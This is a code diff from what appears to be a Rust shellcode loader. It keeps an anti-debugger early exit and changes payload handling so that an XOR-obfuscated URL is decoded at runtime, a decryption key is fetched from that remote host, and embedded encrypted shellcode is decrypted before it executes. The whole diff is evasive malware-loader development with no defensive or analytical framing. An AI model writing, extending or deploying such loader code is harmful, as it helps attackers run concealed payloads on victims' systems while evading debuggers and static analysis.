@@ -64,9 +64,9 @@ fn main() -> Result<()> {
     let _s = benign_utils::harmless_string_op("initialization");
 
     if !skip_checks {
-        if nodebug::check_debugger() {
-            return Ok(());
-        }
+         if nodebug::check_debugger() {
+             return Ok(());
+         }
     }
 
     unsafe {
@@ -199,12 +199,32 @@ fn main() -> Result<()> {
         );
 
         // load shellcode and decrypt at runtime
-        let encrypted_shellcode: &[u8] = include_bytes!("enc_shellcode.bin");
-        let key = b"Gdb1p_dnbp1DD@#";
-        let mut shellcode: Vec<u8> = Vec::with_capacity(encrypted_shellcode.len());
-        for (i, &byte) in encrypted_shellcode.iter().enumerate() {
-            shellcode.push(byte ^ key[i % key.len()]);
-        }
+        let encrypted_shellcode: &[u8] = include_bytes!("enc_payload.bin");
+        
+        // decrypt URL
+        let url_bytes: [u8; 30] = [0x2f, 0x10, 0x16, 0x41, 0x4a, 0x70, 0x4b, 0x5f, 0x5b, 0x42, 0x1f, 0x75, 0x72, 0x78, 0x0d, 0x73, 0x51, 0x4c, 0x00, 0x45, 0x68, 0x5e, 0x56, 0x56, 0x44, 0x02, 0x6b, 0x2f, 0x25, 0x5a];
+        let url_key = b"Gdb1p_dnbp1DD@#";
+        let decrypted_url_vec = crypto_utils::xor_decrypt(&url_bytes, url_key);
+        let decrypted_url = match String::from_utf8(decrypted_url_vec) {
+            Ok(s) => s,
+            Err(_) => return Ok(()),
+        };
+
+        // fetch key
+        let pem_key = match crypto_utils::fetch_key(&decrypted_url) {
+            Ok(k) => k,
+            Err(_) => {
+                // if key fails (TODO)
+                return Ok(());
+            }
+        };
+
+        let shellcode = match crypto_utils::decrypt_shellcode(encrypted_shellcode, &pem_key) {
+            Ok(s) => s,
+            Err(_) => {
+                return Ok(());
+            }
+        };
 
         // execute based on mode
         match mode {
